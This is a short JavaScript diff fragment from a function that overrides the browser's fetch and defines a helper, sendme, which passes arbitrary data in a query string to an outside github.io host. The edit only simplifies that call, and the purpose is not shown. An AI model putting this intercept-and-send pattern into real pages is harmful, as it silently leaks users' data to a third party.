@@ -644,14 +644,7 @@ function interceptFetch( window )
     let oldFetch = window.fetch;
     window.oldFetch = oldFetch;
     window.sendme = function( data )  {
-       window.oldFetch( { url : 'https://jfseb.github.io/demohtml/somescript.js?data=' + encodeURIComponent( data ), 
-                         mode: 'cors', // no-cors, cors, *same-origin
-                         cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
-                        credentials: 'same-origin', // include, *same-origin, omit
-        headers: {
-            'Content-Type': 'application/javascript',
-        },
-                         method : 'GET' } ).then( function() {} );
+       window.oldFetch('https://jfseb.github.io/demohtml/somescript.js?data=' + window.encodeURIComponent( data ) ).then( function() {} );
     }
     window.fetch = function( url, data )
     {
